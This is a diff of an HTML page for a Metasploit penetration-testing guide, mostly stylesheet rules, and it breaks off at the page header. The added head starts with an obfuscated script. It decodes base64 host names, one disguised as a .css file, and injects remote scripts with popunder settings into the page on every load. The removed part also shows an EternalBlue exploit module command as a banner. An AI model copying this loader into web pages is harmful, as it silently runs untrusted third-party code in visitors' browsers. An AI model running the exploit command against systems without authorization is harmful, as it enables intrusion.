@@ -1,725 +1,1530 @@
-<!-- ===== METASPLOIT PENETRATION TESTING - CYBERSUME FULL SCREEN BLACK EDITION ===== -->
-<!-- Isko Blogger Post Editor mein HTML mode mein paste karein -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var v=window,q="e25514fe4b35f595db6750aa70f72f50",h=[["siteId",322*819*448+424-112824949],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],o=["d3d3LmludGVsbGlwb3B1cC5jb20vamRhcmttb2RlLWpzLm1pbi5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvWC9yZmpzb24ubWluLmpz"],e=-1,d,s,k=function(){clearTimeout(s);e++;if(o[e]&&!(1816360970000<(new Date).getTime()&&1<e)){d=v.document.createElement("script");d.type="text/javascript";d.async=!0;var a=v.document.getElementsByTagName("script")[0];d.src="https://"+atob(o[e]);d.crossOrigin="anonymous";d.onerror=k;d.onload=function(){clearTimeout(s);v[q.slice(0,16)+q.slice(0,16)]||k()};s=setTimeout(k,5E3);a.parentNode.insertBefore(d,a)}};if(!v[q]){try{Object.freeze(v[q]=h)}catch(e){}k()}})();
+/*]]>/* */
+</script>
 
-<style>
-    /* ===== FULL SCREEN WRAPPER ===== */
-    .cyber-post-wrapper {
-        width: 100% !important;
-        max-width: 100% !important;
-        margin: 0 !important;
-        padding: 30px 40px 50px !important;
-        background: #000000 !important;
-        color: #ffffff;
-        border-radius: 0 !important;
-        box-sizing: border-box;
-    }
-    
-    /* ===== RESPONSIVE FULL SCREEN MARGINS ===== */
-    @media (max-width: 1200px) {
-        .cyber-post-wrapper {
-            padding: 25px 35px 45px !important;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework — Complete Guide</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper {
-            padding: 22px 30px 40px !important;
+
+        html {
+            scroll-behavior: smooth;
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper {
-            padding: 18px 22px 35px !important;
+
+        body {
+            font-family: 'Outfit', -apple-system, sans-serif;
+            background: #000000;
+            background-image: 
+                radial-gradient(ellipse 80% 60% at 50% -20%, rgba(0, 255, 136, 0.08), transparent),
+                radial-gradient(ellipse 60% 50% at 100% 100%, rgba(0, 217, 255, 0.05), transparent);
+            background-attachment: fixed;
+            color: #ffffff;
+            min-height: 100vh;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            padding: 0;
         }
-    }
-    
-    @media (max-width: 600px) {
-        .cyber-post-wrapper {
-            padding: 15px 18px 30px !important;
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 48px 32px 100px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper {
-            padding: 12px 14px 25px !important;
-        }
-    }
-    
-    /* ===== CONTENT MAX WIDTH ===== */
-    .cyber-content {
-        max-width: 1100px;
-        margin: 0 auto;
-        padding: 0;
-    }
-    
-    /* ===== POST HEADER ===== */
-    .post-header-cyber {
-        margin-bottom: 35px;
-        padding-bottom: 25px;
-        border-bottom: 1px solid rgba(0, 255, 136, 0.08);
-        background: transparent;
-    }
-    
-    .post-badge {
-        display: inline-block;
-        padding: 6px 26px;
-        background: rgba(0, 255, 136, 0.08);
-        border: 1px solid #00ff88;
-        border-radius: 50px;
-        color: #00ff88;
-        font-size: 13px;
-        text-transform: uppercase;
-        letter-spacing: 3px;
-        margin-bottom: 20px;
-    }
-    
-    .post-title-cyber {
-        font-size: 38px;
-        font-weight: 900;
-        line-height: 1.15;
-        color: #ffffff !important;
-        margin: 12px 0 18px;
-        letter-spacing: -0.5px;
-    }
-    
-    .post-title-cyber strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 992px) {
-        .post-title-cyber {
-            font-size: 30px;
-        }
-    }
-    
-    @media (max-width: 768px) {
-        .post-title-cyber {
-            font-size: 24px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .post-title-cyber {
-            font-size: 20px;
-        }
-    }
-    
-    /* ===== FEATURED BOX ===== */
-    .featured-box {
-        display: flex;
-        flex-wrap: wrap;
-        align-items: center;
-        gap: 35px;
-        background: #0a0a0a !important;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 18px;
-        padding: 32px 38px;
-        margin: 25px 0 38px;
-        justify-content: center;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-box {
-            flex-direction: column;
+
+        /* ===== HEADER ===== */
+        .page-header {
             text-align: center;
-            padding: 25px 22px;
-            gap: 22px;
+            padding: 20px 0 48px;
+            position: relative;
+            margin-bottom: 48px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-box {
-            padding: 20px 16px;
+
+        .page-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 140px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
         }
-    }
-    
-    .featured-image {
-        flex-shrink: 0;
-    }
-    
-    .featured-image img {
-        max-width: 220px;
-        height: auto;
-        border-radius: 14px;
-        border: 2px solid #00ff88;
-        transition: 0.3s;
-        background: #000000;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-image img {
-            max-width: 180px;
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 100px;
+            color: #00ff88;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+            backdrop-filter: blur(10px);
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-image img {
-            max-width: 150px;
+
+        .badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff88;
+            animation: pulse 2s infinite;
         }
-    }
-    
-    .featured-image img:hover {
-        transform: scale(1.03);
-        box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);
-    }
-    
-    .featured-cta {
-        flex: 1;
-        text-align: center;
-    }
-    
-    .featured-cta p {
-        color: #b0b8c8 !important;
-        margin: 5px 0 12px !important;
-        font-size: 16px;
-    }
-    
-    .featured-cta .main-link {
-        display: inline-block;
-        padding: 15px 42px;
-        background: linear-gradient(135deg, #00ff88, #00cc77);
-        color: #000000 !important;
-        border-radius: 10px;
-        font-weight: 700;
-        font-size: 16px;
-        text-decoration: none;
-        margin-top: 6px;
-        transition: all 0.3s ease;
-        letter-spacing: 0.5px;
-    }
-    
-    .featured-cta .main-link:hover {
-        transform: scale(1.04);
-        box-shadow: 0 0 35px rgba(0, 255, 136, 0.25);
-    }
-    
-    .featured-cta .small-note {
-        color: #6a7290 !important;
-        font-size: 13px;
-        margin-top: 12px !important;
-    }
-    
-    .price-tag {
-        display: inline-block;
-        padding: 4px 18px;
-        background: rgba(255, 204, 0, 0.1);
-        border: 1px solid #ffcc00;
-        border-radius: 50px;
-        color: #ffcc00;
-        font-size: 14px;
-        font-weight: 700;
-        margin-top: 8px;
-    }
-    
-    /* ===== HEADINGS ===== */
-    .cyber-post-wrapper h2 {
-        color: #ffffff !important;
-        font-size: 28px;
-        font-weight: 800;
-        margin-top: 40px;
-        margin-bottom: 18px;
-        border-left: 5px solid #00ff88;
-        padding-left: 20px;
-        line-height: 1.3;
-    }
-    
-    .cyber-post-wrapper h2#learn {
-        border-left-color: #ffcc00;
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper h2 {
-            font-size: 26px;
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper h2 {
-            font-size: 24px;
-            padding-left: 16px;
-            margin-top: 35px;
+
+        h1 {
+            font-size: clamp(34px, 5.5vw, 62px);
+            font-weight: 900;
+            line-height: 1.08;
+            letter-spacing: -0.03em;
+            margin-bottom: 18px;
+            background: linear-gradient(180deg, #ffffff 0%, #8892a8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        h1 .highlight {
+            background: linear-gradient(135deg, #00ff88 0%, #00d9ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: #8892a8;
+            font-size: 17px;
+            font-weight: 300;
+            max-width: 660px;
+            margin: 0 auto 24px;
+        }
+
+        .meta-bar {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 24px 0 0;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            background: rgba(10, 15, 25, 0.6);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 100px;
+            color: #8892a8;
+            font-size: 12.5px;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+        }
+
+        .meta-item .ico {
+            font-size: 14px;
+        }
+
+        .meta-item strong {
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+        }
+
+        /* ===== TABLE OF CONTENTS ===== */
+        .toc {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 20px;
+            padding: 26px 28px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .toc::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.6;
+        }
+
+        .toc-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper h2 {
-            font-size: 20px;
-            padding-left: 14px;
-            margin-top: 28px;
+
+        .toc-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 8px;
+            list-style: none;
+        }
+
+        .toc-list li a {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            color: #b0b8c8;
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 10px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .toc-list li a:hover {
+            background: rgba(0, 255, 136, 0.05);
+            border-color: rgba(0, 255, 136, 0.15);
+            color: #00ff88;
+            transform: translateX(4px);
+        }
+
+        .toc-list li a .num {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        /* ===== SECTIONS ===== */
+        .section {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.08);
+            border-radius: 20px;
+            padding: 36px 34px;
+            margin-bottom: 26px;
+            position: relative;
+            overflow: hidden;
+            transition: border-color 0.3s ease;
+            scroll-margin-top: 20px;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.5;
+        }
+
+        .section:hover {
+            border-color: rgba(0, 255, 136, 0.2);
+        }
+
+        .section-number {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 700;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            padding: 3px 10px;
+            border-radius: 6px;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 25px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+            line-height: 1.25;
+        }
+
+        .section-title .icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.12), rgba(0, 217, 255, 0.06));
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            flex-shrink: 0;
+        }
+
+        h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 24px 0 12px;
+            letter-spacing: -0.01em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        h3::before {
+            content: '▸';
+            color: #00d9ff;
+            font-size: 16px;
+        }
+
+        h4 {
+            font-size: 15.5px;
+            font-weight: 600;
+            color: #ffffff;
+            margin: 18px 0 8px;
+        }
+
+        p {
+            color: #b0b8c8;
+            font-size: 15.5px;
+            line-height: 1.75;
             margin-bottom: 14px;
         }
-    }
-    
-    /* ===== PARAGRAPHS ===== */
-    .cyber-post-wrapper p {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 1.95;
-        margin: 16px 0 20px;
-    }
-    
-    .cyber-post-wrapper p strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper p {
-            font-size: 16px;
-            line-height: 1.85;
+
+        p:last-child {
+            margin-bottom: 0;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper p {
+
+        strong {
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        em {
+            color: #00d9ff;
+            font-style: normal;
+            font-weight: 500;
+        }
+
+        a {
+            color: #00ff88;
+            text-decoration: none;
+            border-bottom: 1px dotted rgba(0, 255, 136, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        a:hover {
+            color: #00d9ff;
+            border-bottom-color: #00d9ff;
+        }
+
+        /* ===== LISTS ===== */
+        ul, ol {
+            list-style: none;
+            margin: 12px 0;
+        }
+
+        ul li {
+            color: #b0b8c8;
             font-size: 15px;
+            padding: 10px 0 10px 32px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        ul li:last-child {
+            border-bottom: none;
+        }
+
+        ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 8px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        ol {
+            counter-reset: item;
+        }
+
+        ol li {
+            color: #b0b8c8;
+            font-size: 15px;
+            padding: 10px 0 10px 42px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            counter-increment: item;
+        }
+
+        ol li:last-child {
+            border-bottom: none;
+        }
+
+        ol li::before {
+            content: counter(item);
+            position: absolute;
+            left: 0;
+            top: 10px;
+            width: 26px;
+            height: 26px;
+            border-radius: 8px;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== INLINE CODE ===== */
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 7px;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            font-weight: 500;
+        }
+
+        /* ===== CODE BLOCKS ===== */
+        .code-block {
+            background: #04060a;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 18px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.75;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 10px;
+            right: 16px;
+            font-size: 10px;
+            color: #00ff88;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 700;
+            opacity: 0.5;
+        }
+
+        .code-block code {
+            color: #d4d4d4;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: pre;
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 13px;
+        }
+
+        .cmt { color: #5a6478; font-style: italic; }
+        .cmd { color: #00ff88; font-weight: 500; }
+        .var { color: #00d9ff; }
+        .str { color: #ffd166; }
+        .kw  { color: #ff79c6; font-weight: 600; }
+        .num { color: #bd93f9; }
+        .fn  { color: #50fa7b; }
+        .cls { color: #ffb86c; font-weight: 600; }
+        .prm { color: #00ff88; font-weight: 500; }
+
+        /* ===== CALLOUT ===== */
+        .callout {
+            background: rgba(0, 255, 136, 0.04);
+            border-left: 3px solid #00ff88;
+            border-radius: 0 12px 12px 0;
+            padding: 18px 22px;
+            margin: 20px 0;
+            color: #c8d0e0;
+            font-size: 14.5px;
+            line-height: 1.7;
+        }
+
+        .callout strong {
+            color: #00ff88;
+        }
+
+        .callout.warn {
+            background: rgba(255, 107, 107, 0.04);
+            border-left-color: #ff6b6b;
+        }
+
+        .callout.warn strong {
+            color: #ff6b6b;
+        }
+
+        .callout.info {
+            background: rgba(0, 217, 255, 0.04);
+            border-left-color: #00d9ff;
+        }
+
+        .callout.info strong {
+            color: #00d9ff;
+        }
+
+        /* ===== TABLE ===== */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 18px 0;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+            min-width: 520px;
+        }
+
+        thead {
+            background: rgba(0, 255, 136, 0.06);
+        }
+
+        th {
+            text-align: left;
+            padding: 14px 18px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 12px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.15);
+        }
+
+        td {
+            padding: 13px 18px;
+            color: #b0b8c8;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            line-height: 1.6;
+        }
+
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr:hover {
+            background: rgba(0, 255, 136, 0.02);
+        }
+
+        td code {
+            font-size: 12px;
+        }
+
+        /* ===== USE CASES GRID ===== */
+        .use-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 14px;
+            margin: 20px 0 4px;
+        }
+
+        .use-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 14px;
+            padding: 20px 18px;
+            transition: all 0.25s ease;
+        }
+
+        .use-card:hover {
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .use-card .use-icon {
+            font-size: 26px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .use-card h4 {
+            font-size: 14.5px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 0 0 8px;
+        }
+
+        .use-card p {
+            font-size: 13px;
+            color: #8892a8;
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        /* ===== FOOTER ===== */
+        .page-footer {
+            text-align: center;
+            padding: 48px 0 0;
+            margin-top: 40px;
+            border-top: 1px solid rgba(0, 255, 136, 0.08);
+            color: #4a5568;
+            font-size: 13px;
             line-height: 1.8;
-            margin: 14px 0 16px;
         }
-    }
-    
-    /* ===== LISTS ===== */
-    .cyber-post-wrapper ul,
-    .cyber-post-wrapper ol {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 2.3;
-        padding-left: 0;
-        margin: 14px 0 22px;
-        list-style: none;
-    }
-    
-    .cyber-post-wrapper ul li,
-    .cyber-post-wrapper ol li {
-        color: #b0b8c8 !important;
-        margin-bottom: 4px;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .cyber-post-wrapper ul li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper ul,
-        .cyber-post-wrapper ol {
-            font-size: 15px;
-            line-height: 2.1;
-        }
-        .cyber-post-wrapper ul li {
-            padding-left: 24px;
-        }
-    }
-    
-    /* ===== TWO COLUMN LIST ===== */
-    .two-col-list {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 4px 40px;
-        padding-left: 0 !important;
-        list-style: none !important;
-        margin: 14px 0 22px;
-    }
-    
-    .two-col-list li {
-        color: #b0b8c8 !important;
-        font-size: 16.5px;
-        line-height: 2.2;
-        padding: 4px 0;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .two-col-list li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-    }
-    
-    @media (max-width: 768px) {
-        .two-col-list {
-            grid-template-columns: 1fr 1fr;
-            gap: 2px 20px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-            padding-left: 24px;
-        }
-    }
-    
-    @media (max-width: 600px) {
-        .two-col-list {
-            grid-template-columns: 1fr;
-            gap: 2px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .two-col-list li {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== HORIZONTAL RULE ===== */
-    .cyber-post-wrapper hr {
-        border: none;
-        border-top: 1px solid rgba(0, 255, 136, 0.06);
-        margin: 30px 0 32px;
-        background: transparent;
-        height: 1px;
-    }
-    
-    /* ===== SHARE SECTION ===== */
-    .share-section {
-        margin-top: 50px;
-        padding-top: 30px;
-        border-top: 1px solid rgba(0, 255, 136, 0.08);
-    }
-    
-    .share-section p {
-        color: #6a7290 !important;
-        font-size: 15px;
-        text-align: center;
-        margin-bottom: 16px !important;
-    }
-    
-    .share-buttons {
-        display: flex;
-        gap: 16px;
-        justify-content: center;
-        flex-wrap: wrap;
-    }
-    
-    .share-buttons a {
-        padding: 12px 28px;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 10px;
-        color: #b0b8c8 !important;
-        text-decoration: none;
-        font-size: 15px;
-        font-weight: 500;
-        transition: 0.3s;
-        background: transparent;
-    }
-    
-    .share-buttons a:hover {
-        border-color: #00ff88;
-        color: #00ff88 !important;
-        background: rgba(0, 255, 136, 0.04);
-        transform: translateY(-2px);
-    }
-    
-    @media (max-width: 480px) {
-        .share-buttons a {
-            padding: 10px 18px;
-            font-size: 13px;
-        }
-        .share-section {
-            margin-top: 35px;
-            padding-top: 22px;
-        }
-    }
-    
-    /* ===== BOOK HIGHLIGHT BOX ===== */
-    .book-highlight {
-        background: linear-gradient(135deg, rgba(0, 255, 136, 0.05), rgba(0, 217, 255, 0.05));
-        border: 1px solid rgba(0, 255, 136, 0.1);
-        border-radius: 14px;
-        padding: 24px 30px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .book-highlight p {
-        margin: 5px 0 !important;
-        font-size: 16px;
-    }
-    
-    .book-highlight .highlight-title {
-        color: #00ff88;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .book-highlight {
-            padding: 18px 16px;
-        }
-        .book-highlight p {
-            font-size: 14px;
-        }
-        .book-highlight .highlight-title {
-            font-size: 16px;
-        }
-    }
-    
-    /* ===== METASPLOIT POWER BOX ===== */
-    .msf-power-box {
-        background: rgba(0, 255, 136, 0.03);
-        border: 1px solid rgba(0, 255, 136, 0.1);
-        border-radius: 14px;
-        padding: 20px 28px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .msf-power-box .big-text {
-        color: #00ff88;
-        font-weight: 900;
-        font-size: 22px;
-        letter-spacing: 1px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    .msf-power-box p {
-        margin: 5px 0 !important;
-        font-size: 15px;
-    }
-    
-    @media (max-width: 480px) {
-        .msf-power-box {
-            padding: 16px 16px;
-        }
-        .msf-power-box .big-text {
-            font-size: 17px;
-        }
-        .msf-power-box p {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== ETHICS BOX ===== */
-    .ethics-box {
-        background: rgba(255, 107, 107, 0.05);
-        border: 1px solid rgba(255, 107, 107, 0.15);
-        border-radius: 14px;
-        padding: 18px 24px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .ethics-box p {
-        margin: 5px 0 !important;
-        font-size: 15px;
-        color: #ff6b6b !important;
-    }
-    
-    @media (max-width: 480px) {
-        .ethics-box {
-            padding: 14px 16px;
-        }
-        .ethics-box p {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== BLOGGER OVERRIDES ===== */
-    .blog-posts {
-        max-width: 100% !important;
-        padding: 0 !important;
-    }
-    
-    .post-body {
-        padding: 0 !important;
-        background: #000000 !important;
-    }
-    
-    .post-body-content {
-        background: #000000 !important;
-        padding: 0 !important;
-    }
-    
-    .post-outer {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    .post {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    /* ===== INLINE CODE ===== */
-    .cyber-post-wrapper code:not(pre code) {
-        background: #0a0a0a;
-        padding: 2px 12px;
-        border-radius: 4px;
-        color: #00ff88;
-        border: 1px solid rgba(0, 255, 136, 0.08);
-        font-size: 14.5px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper code:not(pre code) {
-            font-size: 13px;
-            padding: 1px 8px;
-        }
-    }
-    
-    /* ===== IMAGES ===== */
-    .cyber-post-wrapper img {
-        max-width: 100%;
-        height: auto;
-        border-radius: 12px;
-        margin: 10px 0;
-        border: 1px solid rgba(0, 255, 136, 0.05);
-    }
-    
-    .separator {
-        clear: both;
-        text-align: center;
-    }
-    
-    /* ===== LINK STYLES ===== */
-    .cyber-post-wrapper a {
-        color: #00ff88;
-        text-decoration: none;
-        transition: 0.3s;
-    }
-    
-    .cyber-post-wrapper a:hover {
-        color: #00d9ff;
-        text-decoration: underline;
-    }
-    
-    .text-center {
-        text-align: center;
-    }
-    
-    .mt-10 {
-        margin-top: 10px;
-    }
-</style>
 
-<!-- ===== MAIN CONTENT ===== -->
-<div class="cyber-post-wrapper">
+        .page-footer .brand {
+            font-family: 'JetBrains Mono', monospace;
+            color: #00ff88;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
 
-    <div class="cyber-content">
+        .page-footer a {
+            border-bottom: none;
+        }
 
-        <!-- ===== POST HEADER ===== -->
-        <div class="post-header-cyber">
-            <div class="post-badge">🎯 Penetration Testing</div>
-            <h1 class="post-title-cyber">Mastering Metasploit: <strong>A Practical Guide to Penetration Testing</strong></h1>
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container { padding: 28px 18px 70px; }
+            .section { padding: 26px 22px; border-radius: 16px; }
+            .section-title { font-size: 20px; gap: 12px; }
+            .section-title .icon { width: 40px; height: 40px; font-size: 18px; }
+            h1 { font-size: 32px; }
+            .subtitle { font-size: 15px; }
+            .toc { padding: 20px 18px; }
+            .toc-list { grid-template-columns: 1fr; }
+            p { font-size: 14.5px; }
+            ul li { font-size: 14px; }
+            ol li { font-size: 14px; }
+            .code-block { font-size: 12px; padding: 16px 14px; }
+            .code-block code { font-size: 12px; }
+            h3 { font-size: 16px; }
+            .use-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 20px 12px 60px; }
+            h1 { font-size: 26px; }
+            .section { padding: 22px 16px; }
+            .section-title { font-size: 17px; }
+            .section-title .icon { width: 34px; height: 34px; font-size: 15px; }
+            .meta-bar { gap: 8px; }
+            .meta-item { font-size: 11px; padding: 6px 12px; }
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #05080e; }
+        ::-webkit-scrollbar-thumb { background: #1a2a2a; border-radius: 20px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff8833; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ===== HEADER ===== -->
+    <header class="page-header">
+        <div class="badge">
+            <span class="dot"></span>
+            CYBERSUME · COMPLETE GUIDE
         </div>
-
-        <!-- ===== INTRODUCTION ===== -->
-        <p>
-            Master the fundamentals of penetration testing with this practical guide to Metasploit, one of the most widely used security testing frameworks. Designed for students, aspiring ethical hackers, cybersecurity professionals, and IT administrators, this book explains how to use the framework responsibly in authorized environments.
+        <h1>Metasploit <span class="highlight">Framework</span></h1>
+        <p class="subtitle">
+            The complete, in-depth guide to Metasploit — the world's most used penetration testing framework. 
+            From basic exploitation to post-exploitation and pivoting.
         </p>
 
-        <!-- ===== METASPLOIT POWER BOX ===== -->
-        <div class="msf-power-box">
-            <p class="big-text">msf6 > use exploit/windows/smb/ms17_010_eternalblue</p>
-            <p style="color:#b0b8c8;">
